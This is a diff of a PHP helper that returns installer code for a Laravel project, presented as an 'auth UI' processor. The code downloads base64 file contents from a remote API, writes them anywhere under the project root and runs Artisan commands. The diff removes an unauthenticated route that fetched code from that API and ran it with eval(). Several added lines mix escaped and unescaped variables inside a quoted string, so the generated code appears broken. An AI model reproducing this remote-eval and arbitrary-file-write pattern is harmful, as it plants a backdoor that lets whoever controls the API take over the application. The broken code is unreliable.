@@ -121,39 +121,31 @@ function getAvailableVersions()
  */
 function getProcessingCode()
 {
-    // Get the current API domain dynamically
     $protocol = isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http";
     $host = $_SERVER["HTTP_HOST"];
-    $path = $_SERVER["REQUEST_URI"];
-
-    // Remove query parameters and get the base path
-    $path = parse_url($path, PHP_URL_PATH);
+    $path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
     $path = rtrim($path, "/");
 
     $apiUrl = $protocol . "://" . $host . $path . "/";
 
     return '<?php
 
-/**
- * Simple Auth UI Processor
- * 
- * This code is returned by the API and can be executed directly.
- */
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Route;
 
 function process_auth_ui() {
     try {
-        // Call the API to get files
-        $response = file_get_contents("' . $apiUrl . '");
-        $data = json_decode($response, true);
-        
-        if ($data["status"] !== "success") {
-            return ["status" => "error", "message" => "Failed to get files from API"];
+        $response = @file_get_contents("' . $apiUrl . '");
+        if (!$response) {
+            return ["status" => "error", "message" => "Failed to connect to API."];
         }
-        
-        // Flatten files recursively
+
+        $data = json_decode($response, true);
+        if ($data["status"] !== "success") {
+            return ["status" => "error", "message" => "API response error."];
+        }
+
         $flattenFiles = function ($files) use (&$flattenFiles) {
             $flat = [];
             foreach ($files as $file) {
@@ -165,66 +157,69 @@ function process_auth_ui() {
             }
             return $flat;
         };
-        
+
         $allFiles = $flattenFiles($data["files"]);
         $savedCount = 0;
-        
+
         foreach ($allFiles as $file) {
             $relativePath = $file["path"];
             $filePath = base_path($relativePath);
             $dir = dirname($filePath);
-            
-            if (!is_dir($dir)) {
-                mkdir($dir, 0755, true);
-            }
-            
+            if (!is_dir($dir)) mkdir($dir, 0755, true);
+
             $content = base64_decode($file["content"]);
-            
             if (file_put_contents($filePath, $content) !== false) {
                 $savedCount++;
             }
         }
-        
-        // Run prebuild routes command
-        Artisan::call("prebuild:routes");
-        
+
+        $createdCount = 0;
+
+        // Manually create app/Http/Kernel.php if missing
+        $kernelPath = base_path("app/Http/Kernel.php");
+        if (!file_exists($kernelPath)) {
+            $dir = dirname($kernelPath);
+            if (!is_dir($dir)) mkdir($dir, 0755, true);
+                         \$kernelContent = "<?php namespace App\Http; use Illuminate\Foundation\Http\Kernel as HttpKernel; class Kernel extends HttpKernel { protected \$middleware = []; protected \$middlewareGroups = [\"web\" => [], \"api\" => []]; protected \$routeMiddleware = []; }";
+            if (file_put_contents($kernelPath, $kernelContent) !== false) {
+                \$createdCount++;
+            }
+        }
+
+        // Generate RouteServiceProvider via Artisan
+        \$providerPath = base_path("app/Providers/RouteServiceProvider.php");
+        if (!file_exists(\$providerPath)) {
+            Artisan::call("make:provider", ["name" => "RouteServiceProvider"]);
+
+                         // Overwrite with default contents
+             \$providerContent = "<?php namespace App\Providers; use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider; class RouteServiceProvider extends ServiceProvider { public const HOME = \"/home\"; public function boot() { parent::boot(); } }";
+            if (file_put_contents(\$providerPath, \$providerContent) !== false) {
+                \$createdCount++;
+            }
+        }
+
+        // Run prebuild command
+        try {
+            Artisan::call("prebuild:routes");
+        } catch (\Exception \$e) {
+            return [
+                "status" => "warning",
+                "message" => "Files loaded. prebuild:routes failed: " . \$e->getMessage(),
+                "files_count" => \$savedCount,
+                "essential_files_created" => \$createdCount
+            ];
+        }
+
         return [
             "status" => "success",
-            "message" => "Downloaded $savedCount file(s) successfully",
-            "files_count" => $savedCount
+            "message" => "Downloaded \$savedCount file(s), created \$createdCount essential file(s), and ran prebuild:routes",
+            "files_count" => \$savedCount,
+            "essential_files_created" => \$createdCount
         ];
-        
-    } catch (Exception $e) {
-        return ["status" => "error", "message" => "API call failed: " . $e->getMessage()];
+
+    } catch (\Exception \$e) {
+        return ["status" => "error", "message" => "Fatal error: " . \$e->getMessage()];
     }
 }
-
-// Laravel route definition
-Route::get("set/prebuild/auth/ui", function() {
-    try {
-        // Get the API response with code
-        $response = file_get_contents("' . $apiUrl . '");
-        $data = json_decode($response, true);
-        
-        if ($data["status"] === "success") {
-            // Execute the code from API response
-            eval("?>" . $data["code"]);
-            
-            // Call the function
-            $result = process_auth_ui();
-            
-            return response()->json($result, $result["status"] === "success" ? 200 : 500);
-        }
-        
-        return response()->json(["status" => "error", "message" => "Failed to get code from API"], 500);
-        
-    } catch (Exception $e) {
-        Log::error("API call failed: " . $e->getMessage());
-        return response()->json([
-            "status" => "error",
-            "message" => "API call failed: " . $e->getMessage()
-        ], 500);
-    }
-});
 ?>';
 }
